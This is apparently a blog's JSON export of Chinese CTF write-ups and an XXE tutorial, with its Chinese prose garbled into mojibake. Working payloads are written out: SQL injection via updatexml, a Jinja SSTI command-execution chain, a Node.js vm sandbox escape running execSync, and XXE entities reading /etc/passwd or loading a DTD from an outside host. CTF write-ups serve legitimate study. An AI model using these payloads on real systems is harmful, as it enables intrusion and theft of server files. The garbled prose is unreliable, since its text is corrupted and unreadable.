·æˆ‘ä»¬è®¿é—®çš„æ˜¯index.phpï¼Œä½†ç»è¿‡basenameä¼šè¿”å›config.phpã€‚ä½†æ­£åˆ™åŒ¹é…äº†è¿™ä¸ªæ–‡ä»¶å,å› æ­¤ç”¨ä¸å¯æ‰“å°å­—ç¬¦ç»•è¿‡ï¼Œæ„å»ºpayloadè¯»å–flagï¼š 1/index.php/config.php/%ff?souce [RCTF2015]EasySQLçœ‹åˆ°æ³¨å†Œç™»å½•ä»¥åŠæç¤ºsqlï¼Œå¾ˆæ˜æ˜¾çš„äºŒæ¬¡æ³¨å…¥ã€‚æ³¨å†Œè´¦å·æ—¶usernameè®¾ç½®ï¼š 1&#x27;mrl64&quot;\\ æ¥ç€å‘ç°å¯ä»¥æ”¹å¯†ç ï¼Œå°è¯•æ”¹å¯†å‘ç°æŠ¥é”™: 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;\\&quot; and pwd=&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;&#x27; at line 1 å› æ­¤åˆ¤æ–­æ˜¯åŒå¼•å·åŒ…è£¹ï¼Œæ¨æµ‹sqlè¯­å¥ï¼š 1select * from user where username=&quot;&#x27;mrl64&quot;\\&quot; and password=&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27; å› æ­¤åˆ©ç”¨è¿™ç‚¹åœ¨æ³¨å†Œå‡ºçš„usernameè¿›è¡Œæ³¨å…¥ï¼Œè®°å¾—è¦ç»•è¿‡wafï¼š 123456789101112131415161718192021222324251&quot;||(updatexml(1,concat(0x7e,(select(database())),0x7e),1))#//web_sqli1&quot;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1))#//article,flag,users1&quot;||(updatexml(1,concat(0x7e,(select(concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)&amp;&amp;(column_name)regexp(&#x27;^r&#x27;)),0x7e),1))#//real_flag_1s_here//ç”±äºè¾“å‡ºé•¿åº¦é™åˆ¶ï¼Œè¿™é‡Œç”¨åˆ°äº†æ­£åˆ™åŒ¹é…ä½¿è¡¨åå®Œå…¨æ˜¾ç¤º1&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)),0x7e),1))#//flag&#123;26d9bb05-00be-4bc0-bfcc-03//æ— æ•ˆä¿¡æ¯å¤ªå¤šå¯¼è‡´flagæ— æ³•æ˜¾ç¤ºï¼Œå› æ­¤ä½¿ç”¨æ­£åˆ™åŒ¹é…1&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))),0x7e),1))#//&#125;d8ea481f9d30-ccfb-0cb4-eb00-50//ç”±äºflagé•¿åº¦é™åˆ¶å› æ­¤é€†åºè¾“å‡ºååŠéƒ¨åˆ†flag [CSCCTF 2019 Qual]FlaskLighté¢˜ç›®æç¤ºæˆ‘ä»¬sstiï¼Œæ¥ç€å®¡æŸ¥å…ƒç´ å‘ç°GETä¸€ä¸ªsearchå…ƒç´ ï¼Œæ„å»ºpayloadæŸ¥æ‰¾å­ç±»ï¼š 1&#123;&#123;&#123;&#125;.__class__.__bases__[0].__subclasses__()&#125;&#125; æ¥ç€ç”¨subprocess.Popenè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œpayloadï¼š 1&#123;&#123;&#123;&#125;.__class__.__bases__[0].__subclasses__()[258](&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"ã€hgame week4ã€‘write up","slug":"ã€hgame-week4ã€‘write-up","date":"2022-02-18T10:40:37.000Z","updated":"2022-02-18T13:29:48.942Z","comments":true,"path":"2022/02/18/ã€hgame-week4ã€‘write-up/","link":"","permalink":"http://example.com/2022/02/18/%E3%80%90hgame-week4%E3%80%91write-up/","excerpt":"å‰è¨€ å››å‘¨çš„æ¯”èµ›ç»ˆäºç»“æŸäº†ï¼Œæœ€åæ€»è®¡æ‹¿äº†9676åˆ†ï¼Œä½åˆ—20åã€‚","text":"å‰è¨€ å››å‘¨çš„æ¯”èµ›ç»ˆäºç»“æŸäº†ï¼Œæœ€åæ€»è®¡æ‹¿äº†9676åˆ†ï¼Œä½åˆ—20åã€‚ CRYPTOECCç»™äº†ä¸ªsageæ–‡ä»¶ï¼Œå®¡è®¡ä»£ç ï¼š 123456789101112131415161718192021222324252627from Crypto.Util.number import getPrimefrom libnum import s2nfrom secret import flagp = getPrime(256)a = getPrime(256)b = getPrime(256)E = EllipticCurve(GF(p),[a,b])m = E.random_point()G = E.random_point()k = getPrime(256)K = k * Gr = getPrime(256)c1 = m + r * Kc2 = r * Gcipher_left = s2n(flag[:len(flag)//2]) * m[0]cipher_right = s2n(flag[len(flag)//2:]) * m[1]print(f&quot;p = &#123;p&#125;&quot;)print(f&quot;a = &#123;a&#125;&quot;)print(f&quot;b = &#123;b&#125;&quot;)print(f&quot;k = &#123;k&#125;&quot;)print(f&quot;E = &#123;E&#125;&quot;)print(f&quot;c1 = &#123;c1&#125;&quot;)print(f&quot;c2 = &#123;c2&#125;&quot;)print(f&quot;cipher_left = &#123;cipher_left&#125;&quot;)print(f&quot;cipher_right = &#123;cipher_right&#125;&quot;) å‘ç°æ˜¯ä¸€ä¸ªæ¤­åœ†åŠ å¯†çš„é€»è¾‘ï¼Œç”Ÿæˆä¸€ä¸ªæ¤­åœ†åå–éšæœºä¸€ç‚¹ä½œä¸ºæ˜æ–‡ï¼Œå†æ ¹æ®é€»è¾‘ç”Ÿæˆä¸¤ä¸ªå¯†æ–‡ã€‚è€Œflagæ˜¯æ ¹æ®æ˜æ–‡ç‚¹çš„xï¼Œyè½´è¿›è¡ŒåŠ å¯†ï¼Œflagå·¦åŠè¾¹ä¹˜xè½´è·å¾—flagå¯†æ–‡1ï¼Œå³åŠè¾¹ä¹˜yè½´è·å¾—å¯†æ–‡2ï¼Œæ ¹æ®é€»è¾‘å†™è§£å¯†è„šæœ¬ï¼š 123456789101112131415p = 74997021559434065975272431626618720725838473091721936616560359000648651891507a = 61739043730332859978236469007948666997510544212362386629062032094925353519657b = 87821782818477817609882526316479721490919815013668096771992360002467657827319k = 93653874272176107584459982058527081604083871182797816204772644509623271061231E = EllipticCurve(GF(p),[a,b])c1 = E(14455613666211899576018835165132438102011988264607146511938249744871964946084,25506582570581289714612640493258299813803157561796247330693768146763035791942)c2 = E(37554871162619456709183509122673929636457622251880199235054734523782483869931,71392055540616736539267960989304287083629288530398474590782366384873814477806)m = c1-k*c2cipher_left = 68208062402162616009217039034331142786282678107650228761709584478779998734710cipher_right = 27453988545002384546706933590432585006240439443312571008791835203660152890619flag1=cipher_left/m[0]flag2=cipher_right/m[1]print(hex(flag1))print(hex(flag2)) è·å¾—ç»“æœåè§£16è¿›åˆ¶å¾—åˆ°flagï¼š PRNGåå­—å°±å‘Šè¯‰æˆ‘ä»¬æ˜¯ä¼ªéšæœºï¼Œå…ˆçœ‹åŠ å¯†è„šæœ¬ï¼š 1234567891011import refrom random import randrangefrom libnum import s2nfrom secret import flagfrom PRNG import PRNGmt = PRNG(randrange(0, 1 &lt;&lt; 32))print([mt() for _ in range(624)])print([part ^ mt() for part in map(s2n, re.findall(&quot;.&#123;1,4&#125;&quot;, flag))]) ç›¸å½“ç®€å•ç²—æš´ï¼Œç»™äº†æˆ‘ä»¬624ä½ä¼ªéšæœºå€¼ï¼Œæˆ‘ä»¬è¦æ ¹æ®è¿™624ä½æ¨å‡ºæ¥ä¸‹æ¥çš„ä¼ªéšæœºå€¼ï¼Œè€Œå¯†æ–‡æ¯å››ä½flagä¸æ¥ä¸‹æ¥çš„ä¼ªéšæœºå€¼è¿›è¡Œå¼‚æˆ–ï¼Œæˆ‘ä»¬ç›´æ¥å€Ÿç”¨MT19937Predictoråº“ç¼–å†™è„šæœ¬ï¼š 1234567891011121314151617import randomfrom mt19937predictor import MT19937Predictorfrom libnum import n2spredictor = MT19937Predictor()list=[num*624]for i in list: predictor.setrandbits(i, 32)list2=[3437104340, 508103176, 1635844121, 878522509, 1923790547, 1727955782, 1371509208, 3182873539, 156878129, 1757777801, 1472806960, 3486450735, 2307527058, 2950814692, 1817110380, 372493821, 729662950, 2366747255, 774823385, 387513980, 1444397883]flag = b&quot;&quot;for j in list2: key = predictor.getrandbits(32) flag += n2s(j ^ key) print(flag) å¾—åˆ°flagï¼š MISCæ‘†çƒ‚è¿™å‘¨å”¯ä¸€åšå‡ºæ¥çš„miscï¼Œå¤ªèœäº†è¿˜æ˜¯ã€‚é¦–å…ˆä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªè¢«åŠ å¯†çš„å‹ç¼©åŒ…ï¼Œbinwalkå‘ç°è—äº†ä¸€å¼ å›¾ç‰‡ï¼Œforemostæå–å‡ºæ¥ã€‚ è§‚å¯Ÿ010ï¼Œå‘ç°æ˜¯ä¸€å¼ apngï¼š åˆ©ç”¨ç½‘ç«™åˆ†ç¦»åæ˜¯ä¸¤å¼ é•¿å¾—ä¸€æ¨¡ä¸€æ ·ä½†æ˜¯å¤§å°ä¸ä¸€æ ·çš„å›¾ç‰‡ï¼Œåˆ¤æ–­æ˜¯ç›²æ°´å°ï¼Œåˆ©ç”¨å·¥å…·æå–ç›²æ°´å°ï¼š å¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼š4C*9wfg976 è§£å‹å‡ºæ¥å‘ç°æ˜¯äºŒç»´ç ï¼Œæ‹¼æ¥ï¼š æœ€åæ‰«æå‡ºæ¥ä¸€æ®µæ–‡å­—ï¼Œä½†æ˜¯ç”¨QR Reserchæ‰«ææ—¶å‘ç°æ–‡å­—ä¹‹é—´å­˜åœ¨é—®å·ï¼Œåˆ¤æ–­é›¶å®½éšå†™ï¼Œåœ¨çº¿ç½‘ç«™è§£å¯†å¾—åˆ°flagï¼š At0mçš„ç»™ä½ ä»¬çš„(è¿Ÿåˆ°çš„)æƒ…äººèŠ‚ç¤¼ç‰©ï¼ˆèµ›åï¼‰æ‰“å¼€å‹ç¼©åŒ…ï¼Œä¸€ä¸ªè§†é¢‘æ˜¯web3çš„hintï¼Œä¸€ä¸ªè§†é¢‘æ˜¯aviæ ¼å¼ï¼ŒçŒœæµ‹MSUéšå†™ï¼Œhintè§†é¢‘ä¸­çš„åˆ‡å±å°è¯äº†è¿™ä¸€çŒœæµ‹ï¼š æ¥ç€å¯»æ‰¾passcodeï¼Œ010æŸ¥çœ‹å‹ç¼©åŒ…å‘ç°è—ç€ä¸€ä¸ªhide.txtï¼Œç”¨7zæ‰“å¼€æŸ¥çœ‹ï¼š 12ç§‹åå±±è½¦ç¥Atomå¼€è½¦å•¦4 up left down up right down up left up down right down up left down up right down up left up down right down up left down up right up down left up down right down up left down up right down up left up down right down up left up down down up up down right down up left up down right up down left up down right down up left up down right up åšé¢˜æ—¶åšåˆ°è¿™é‡Œè¢«å¡æ­»äº†ï¼Œçœ‹äº†wpæ‰å‘ç°ä¸Šä¸‹å·¦å³æ˜¯ä»£è¡¨æ¢æŒ¡æ–¹å‘ï¼Œéº»äº†ã€‚4è¿›åˆ¶ç¼–ç ï¼Œæ²¹é—¨ä»£è¡¨ä¿æŒï¼Œè§£å¾—passcodeä¸º6557255ï¼Œè§£å¯†è·å¾—flagï¼š 1hgame&#123;Q1ng_R3n_J1e_Da_Sh4_CTF&#125; REVERSEezvmææ¸…æ¥švmçš„é€»è¾‘å°±è¡Œäº†ï¼Œå…·ä½“é€»è¾‘å‚è€ƒå®˜æ–¹wpå§ï¼Œè„šæœ¬ç ´è§£ï¼š 12345678xor_keys = [94, 70, 97, 67, 14, 83, 73, 31, 81, 94, 54, 55, 41, 65, 99, 59, 100,59, 21, 24, 91, 62, 34, 80, 70, 94, 53, 78, 67, 35, 96, 59]plain_text = []cipher = [142, 136, 163, 153, 196, 165, 195, 221, 25, 236, 108, 155, 243, 27, 139,91, 62, 155, 241, 134, 243, 244, 164, 248, 248, 152, 171, 134, 137, 97, 34, 193]for i in range(0,32): plain_text.append(chr((cipher[i]^xor_keys[i])//2))print(&#x27;&#x27;.join(plain_text)) å¾—åˆ°flagï¼š 1hgame&#123;Ea$Y-Vm-t0-PrOTeCT_cOde!!&#125; WEBMarkdown Onlineï¼ˆèµ›åï¼‰è¿™é¢˜æƒ³å‡ºæ¥å‰ä¸€åŠï¼Œåä¸€åŠæ˜¯ç»•rceçš„ä¸€ä¸ªæ²™ç›’vmé€ƒé€¸ï¼Œå½“æ—¶åšçš„æ—¶å€™æ²¡æ‰¾åˆ°payloadï¼Œä¸å¤ªåº”è¯¥ã€‚ é¦–å…ˆçœ‹ç™»å½•é€»è¾‘ï¼š 1234567891011121314function LoginController(req, res) &#123; if (req.body.username === &quot;admin&quot; &amp;&amp; req.body.password.length === 16) &#123; try &#123; req.body.password = req.body.password.toUpperCase() if (req.body.password !== &#x27;54gkj7n8uo55vbo2&#x27;) &#123; return res.status(403).json(&#123;msg: &#x27;invalid username or password&#x27;&#125;) &#125; &#125; catch (__) &#123;&#125; req.session[&#x27;unique_id&#x27;] = randString.generate(16) res.json(&#123;msg: &#x27;ok&#x27;&#125;) &#125; else &#123; res.status(403).json(&#123;msg: &#x27;login failed&#x27;&#125;) &#125;&#125; å°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²è½¬å¤§å†™åä¸54gkj7n8uo55vbo2è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰æ‰èƒ½ç™»é™†æˆåŠŸã€‚ä½†è¿™æ˜¾ç„¶æ˜¯ä¸å¯èƒ½çš„ï¼Œä½†æˆ‘ä»¬æ³¨æ„åˆ°å…³é”®ç‚¹åœ¨äºï¼Œè¿™ä¸ªæ¯”è¾ƒå®åœ¨å¼‚å¸¸æ•è·ä¸­è¿›è¡Œçš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è®©è¯­å¥å‡ºé”™è¾¾åˆ°ç»•è¿‡çš„æ•ˆæœï¼Œå› æ­¤æˆ‘ä»¬æ„å»ºpayloadï¼š æˆåŠŸç»•è¿‡ï¼Œè¿›å…¥mdç•Œé¢ã€‚è¿™é‡Œæ˜¯åˆ©ç”¨markdown-itä¸è½¬ä¹‰htmlæ ‡ç­¾çš„æ¡ä»¶ï¼Œæ„é€ ä¸€ä¸ªæ¶æ„çš„scriptæ ‡ç­¾ï¼Œåˆ©ç”¨å…¶ä¸­çš„ä»£ç æ¥é€ƒé€¸vmæ²™ç®±å¹¶å®ç°RCEï¼ŒåŒæ—¶éœ€è¦bypassæ¥ç»•è¿‡wafã€‚æ„å»ºpayloadï¼š 1234&lt;script&gt;var h=&#x27;child_p&#x27;;var e=&#x27;rocess&#x27;;var i=[h,e].join(&#x27;&#x27;);x=clearImmediate[`$&#123;`$&#123;`constructo`&#125;r`&#125;`][`$&#123;`$&#123;`constructo`&#125;r`&#125;`][`$&#123;`$&#123;`constructo`&#125;r`&#125;`]([`$&#123;`$&#123;`return proces`&#125;s`&#125;`])();y=x.mainModule.require(i);z=y.execSync(&#x27;cat /flag&#x27;).toString();document.write(z);&lt;/script&gt; å¾—åˆ°flagï¼š åªèƒ½è¯´nodejsçš„æ²™ç›’é€ƒé€¸ç¡®å®æ˜¯çŸ¥è¯†ç›²åŒºï¼Œè¿™æ³¢æ˜¯è¢«æ•™è‚²äº†ã€‚ Commentæ ¹æ®æç¤ºä¸‹è½½www.zipï¼Œè·å–æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;?phprequire &#x27;./init.php&#x27;;require_once &#x27;./db.php&#x27;;libxml_disable_entity_loader(false);function waf($str): bool &#123; if (preg_match(&#x27;/file|glob|http|dict|gopher|php|ftp|ssh|phar/i&#x27;, $str)) &#123; return true; &#125; return false;&#125;function save() &#123; if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] != &#x27;POST&#x27;) &#123; echo json_encode([&#x27;error&#x27; =&gt; &#x27;wrong method&#x27;]); return; &#125; $data = file_get_contents(&#x27;php://input&#x27;); if (waf($data)) &#123; http_response_code(403); echo json_encode([&#x27;error&#x27; =&gt; &#x27;Hacker!&#x27;]); return; &#125; $id = $_SESSION[&#x27;unique_id&#x27;]; $db = getDB(); $stmt = $db-&gt;prepare(&#x27;INSERT INTO comments (sender,content) VALUES (?,?)&#x27;); $stmt-&gt;execute([$id, $data]); if ($stmt-&gt;rowCount() != 0) &#123; echo json_encode([&#x27;msg&#x27; =&gt; &#x27;success&#x27;]); &#125; else &#123; http_response_code(500); echo json_encode([&#x27;error&#x27; =&gt; &#x27;failed to create records&#x27;]); &#125;&#125;function parseXML($str) &#123; $dom = new DOMDocument(); try &#123; $dom-&gt;loadXML($str, LIBXML_NOENT | LIBXML_DTDLOAD); &#125; catch (Exception $e) &#123; http_response_code(400); echo json_encode([&#x27;error&#x27; =&gt; &#x27;invalid xml data&#x27;]); die(); &#125; $attrs = simplexml_import_dom($dom); if (!isset($attrs-&gt;content)) &#123; http_response_code(400); echo json_encode([&#x27;error&#x27; =&gt; &#x27;content is empty&#x27;]); die(); &#125; if (waf($attrs-&gt;sender) || waf($attrs-&gt;content)) &#123; http_response_code(403); echo json_encode([&#x27;error&#x27; =&gt; &#x27;Hacker!&#x27;]); die(); &#125; if ($attrs-&gt;sender == &#x27;admin&#x27; &amp;&amp; !preg_match(&#x27;/admin/i&#x27;, $str)) &#123; $flag = &#x27;hgame&#123;xxxxx&#125;&#x27;; $attrs-&gt;content = $flag; &#125; return $attrs;&#125;function get() &#123; $id = $_SESSION[&#x27;unique_id&#x27;]; $db = getDB(); $stmt = $db-&gt;prepare(&#x27;SELECT * FROM comments WHERE sender=?&#x27;); $stmt-&gt;execute([$id]); $data = $stmt-&gt;fetchAll(); $result = []; foreach ($data as $key =&gt; $val) &#123; array_push($result, parseXML($val[&#x27;content&#x27;])); &#125; echo json_encode($result);&#125;switch ($_GET[&#x27;action&#x27;]) &#123; case &#x27;get&#x27;: get(); break; case &#x27;add&#x27;: save(); break; case &#x27;info&#x27;: echo json_encode([&#x27;unique_id&#x27; =&gt; $_SESSION[&#x27;unique_id&#x27;]]); break; default: http_response_code(400); echo json_encode([&#x27;error&#x27; =&gt; &#x27;no such action&#x27;]); break;&#125; å®¡è®¡ä»£ç å‘ç°æ˜¯ä¼ å…¥xmlï¼Œä¸”ä¸èƒ½ä¼ å…¥ä¼ªåè®®ã€‚è€Œè·å–flagçš„æ–¹å¼æ˜¯ä»¤ä¼ å…¥çš„æ ‡ç­¾&lt;sender&gt;å†…çš„å€¼ä¸ºadminï¼Œä½†æ˜¯ä¼ å…¥çš„å†…å®¹ä¸èƒ½å‡ºç°adminï¼Œå› æ­¤åˆ©ç”¨xxeåšæ‹¼æ¥ä¼ å…¥å°±å¯ä»¥äº†ï¼š å¾—åˆ°flagï¼š FileSystemè¿™é¢˜è€ƒå¯Ÿçš„æ˜¯goè¯­è¨€ï¼Œé¦–å…ˆç»™äº†æˆ‘ä»¬æºç ï¼š 123456789101112131415161718package mainimport ( &quot;log&quot; &quot;net/http&quot;)func fileHandler(w http.ResponseWriter, r *http.Request) &#123; http.FileServer(http.Dir(&quot;./&quot;)).ServeHTTP(w, r)&#125;func main() &#123; http.HandleFunc(&quot;/&quot;, fileHandler) http.HandleFunc(&quot;/there_may_be_a_flag&quot;, func(w http.ResponseWriter, r *http.Request) &#123; w.Write([]byte(`No! You can&#x27;t see the flag!`)) &#125;) log.Fatal(http.ListenAndServe(&quot;:8889&quot;, nil))&#125; è™½ç„¶æ²¡å­¦è¿‡goï¼Œä½†æ˜¯ä¸å¦¨ç¢è¯»ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯å¼€äº†ä¸ª/there_may_be_a_flagè·¯ç”±è¦æˆ‘ä»¬è®¿é—®ï¼Œä½†æ˜¯ç›´æ¥è®¿é—®çš„è¯ä¼šè¢«æ‹’ç»ã€‚è¿™é‡Œæˆ‘ä»¬è¦ç”¨åˆ°golangçš„ä¸€ä¸ªå®‰å…¨æ¼æ´ï¼Œè¯¦ç»†å‚è€ƒä¸‹é¢çš„åšå®¢ï¼šgolang çš„ä¸€äº›å®‰å…¨é—®é¢˜ å¯¹äºCONNECTè¯·æ±‚ï¼Œpathå’Œhostéƒ½ä¸ä¼šæ”¹å˜å…¶å†…å®¹,å› æ­¤æˆ‘ä»¬æ„å»ºpayloadï¼Œè·å–flagï¼š","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"XXEçš„å­¦ä¹ ","slug":"XXEçš„å­¦ä¹ ","date":"2022-02-13T02:33:57.000Z","updated":"2022-02-14T07:10:07.472Z","comments":true,"path":"2022/02/13/XXEçš„å­¦ä¹ /","link":"","permalink":"http://example.com/2022/02/13/XXE%E7%9A%84%E5%AD%A6%E4%B9%A0/","excerpt":"å‰è¨€ æ‰“hgameçš„æ—¶å€™æ‰“å‡ºæ¥ä¸€ä¸ªæ–°çŸ¥è¯†ç‚¹ï¼Œèµ¶ç´§è®°å½•ä¸‹è¿™ä¸ªæ¼æ´ã€‚ä¸è¿‡åœ¨å­¦ä¹ xxeä¹‹å‰ï¼Œæˆ‘ä»¬è¦å…ˆè®¤è¯†xmlã€‚","text":"å‰è¨€ æ‰“hgameçš„æ—¶å€™æ‰“å‡ºæ¥ä¸€ä¸ªæ–°çŸ¥è¯†ç‚¹ï¼Œèµ¶ç´§è®°å½•ä¸‹è¿™ä¸ªæ¼æ´ã€‚ä¸è¿‡åœ¨å­¦ä¹ xxeä¹‹å‰ï¼Œæˆ‘ä»¬è¦å…ˆè®¤è¯†xmlã€‚ è®¤è¯†xmlä»€ä¹ˆæ˜¯xmlXMLï¼ˆEXtensible Markup Languageï¼‰ï¼Œå³å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼Œæ˜¯ä¸€ç§æ ‡è®°è¯­è¨€ï¼Œå…¶æ ‡ç­¾æ²¡æœ‰é¢„å®šä¹‰ï¼Œæ‚¨éœ€è¦è‡ªè¡Œå®šä¹‰æ ‡ç­¾ï¼Œæ˜¯W3Cçš„æ¨èæ ‡å‡†ã€‚å…¶äºHTMLçš„åŒºåˆ«æ˜¯ï¼š HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ® XML è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ® XMLæ ‡ç­¾æ ¹æ®è‡ªå·±ä¸»è§‚å®šä¹‰ï¼Œä¸åƒHTMLæ˜¯è¢«é¢„å®šä¹‰å¥½çš„ ä¸‹é¢è¿™ä¸ªä¾¿æ˜¯å…¸å‹çš„xmlæ–‡æ¡£ï¼š 12345678910&lt;!--XMLå£°æ˜--&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!--DTDï¼Œå¯é€‰--&gt; &lt;!DOCTYPE any[ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;!--æ–‡æ¡£å…ƒç´ --&gt; &lt;foo&gt;&amp;xxe;&lt;/foo&gt; ä»€ä¹ˆæ˜¯DTDDTDï¼ˆDocument Type Definitionï¼‰ï¼Œå³æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œä½œç”¨æ˜¯å®šä¹‰XMLæ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚ DTDå£°æ˜DTDå¯è¢«æˆè¡Œåœ°å£°æ˜äºXMLæ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚ å†…éƒ¨DOCTYPEå£°æ˜ï¼š1&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt; ä¾‹å¦‚ï¼š 123456&lt;!DOCTYPE any[ &lt;!ENTITY a &quot;admin&quot;&gt;]&gt;&lt;sender&gt;&amp;a&lt;/sender&gt;&lt;!-- admin --&gt; å¤–éƒ¨æ–‡æ¡£å£°æ˜:1&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;æ–‡ä»¶å&quot;&gt; ä¾‹å¦‚ï¼š 12345678910&lt;!DOCTYPE any[ &lt;!ENTITY % a SYSTEM &quot;http://xx.xx.xx.xx/xml.dtd&quot;&gt; %a;]&gt;&lt;flag&gt;&amp;b&lt;/flag&gt;&lt;!-- dGhpc18xc180X2ZMYTk= --&gt;xx.xx.xx.xx/xml.dtd:&lt;!ENTITY b SYSTEM &quot;data://text/plain;base64,dGhpc18xc180X2ZMYTk=&quot;&gt; DTDå®ä½“DTDå®ä½“ä¸€èˆ¬åˆ†ä¸ºä¸‰ç§ï¼šå†…éƒ¨å®ä½“ã€å‚æ•°å®ä½“ä»¥åŠå¤–éƒ¨å®ä½“ã€‚ å†…éƒ¨å®ä½“ï¼š1&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt; ä¾‹å¦‚ï¼š 123456&lt;!DOCTYPE any[ &lt;!ENTITY a &quot;admin&quot;&gt;]&gt;&lt;sender&gt;&amp;a&lt;/sender&gt;&lt;!-- admin --&gt; å¤–éƒ¨å®ä½“ï¼š1&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt; ä¾‹å¦‚ï¼š 123456&lt;!DOCTYPE any[ &lt;!ENTITY a SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;]&gt;&lt;flag&gt;&amp;a&lt;/flag&gt;&lt;!-- dGhpc18xc180X2ZMYTk= --&gt; å‚æ•°å®ä½“ï¼š12&lt;!ENTITY %å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;&lt;!ENTITY %å®ä½“åç§° SYSTEM &quot;URI&quot;&gt; ä¾‹å¦‚ï¼š 123456789&lt;!DOCTYPE any[ &lt;!ENTITY % a &quot;&lt;!ENTITY b &quot;admin&quot;&gt;&quot;&gt; &lt;!ENTITY % c &quot;&lt;!ENTITY d SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;&quot;&gt; %a; %c;]&gt;&lt;sender&gt;&amp;b;&amp;d&lt;/sender&gt;&lt;!-- admindGhpc18xc180X2ZMYTk= --&gt; æ³¨æ„ï¼šå‚æ•°å®ä½“ç”¨% nameå£°æ˜ï¼Œå¼•ç”¨æ—¶ç”¨%name;ï¼Œåªèƒ½åœ¨DTDä¸­ç”³æ˜ï¼ŒDTDä¸­å¼•ç”¨ã€‚ å¤–éƒ¨å®ä½“å¼•ç”¨å¯æ”¯æŒå¤šç§åè®®ï¼š XXEæ”»å‡»æ—¶çš„ç»•è¿‡ENTITYã€SYSTEMã€fileç­‰å…³é”®è¯è¿‡æ»¤ç¼–ç è½¬åŒ–ä¸ºUTF-16ç»•è¿‡ï¼š 1cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml httpè¢«è¿‡æ»¤dataä¼ªåè®®ç»•è¿‡ã€htmlå®ä½“ç¼–ç ç»•è¿‡ã€æ–‡ä»¶ä¸Šä¼ ç­‰ç­‰ï¼Œä»¥dataä¼ªåè®®ä¸ºä¾‹ï¼š 12345678910&lt;?xml version=&quot;1.0&quot;&gt;&lt;!DOCTYPE any[ &lt;!ENTITY % a SYSTEM &quot;data://text/plain;base64,PCFFTlRJVFkgJSBiIFNZU1RFTSAnaHR0cDovL3h4Lnh4Lnh4Lnh4L3htbC5kdGQnPg==&quot;&gt; %a; %b;]&gt;&lt;flag&gt;&amp;a;&lt;/flag&gt;&lt;!--ç¼–ç å†…å®¹--&gt;&lt;!ENTITY % b SYSTEM &#x27;http://xx.xx.xx.xx/xml.dtd&#x27;&gt; [NCTF2019]Fake XML cookbookè¿™é¢˜è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼ŒåŸºæœ¬ç®€å•äº†è§£ä¸‹xmlå°±å¯ä»¥åšå‡ºæ¥äº†ã€‚ è¿›å…¥ç½‘é¡µå‘ç°æ˜¯è¦è¿›è¡Œç™»å½•ï¼Œå°è¯•æŠ“åŒ…å‘ç°POSTéƒ¨åˆ†æ˜¯xmlï¼š 1&lt;user&gt;&lt;username&gt;1&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt; å› æ­¤ç›´æ¥æ„é€ å¤–éƒ¨å¼•ç”¨è¯»å–ï¼š 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE any[ &lt;!ENTITY a SYSTEM &quot;file:///flag&quot;&gt; ]&gt;&lt;user&gt;&lt;username&gt;&amp;a;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt; è¯»å–flagï¼š 12&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;flag&#123;e9ac9a2a-8a06-47c9-8cb1-0dd2ecbeb01f&#125;&lt;/msg&gt;&lt;/result&gt; 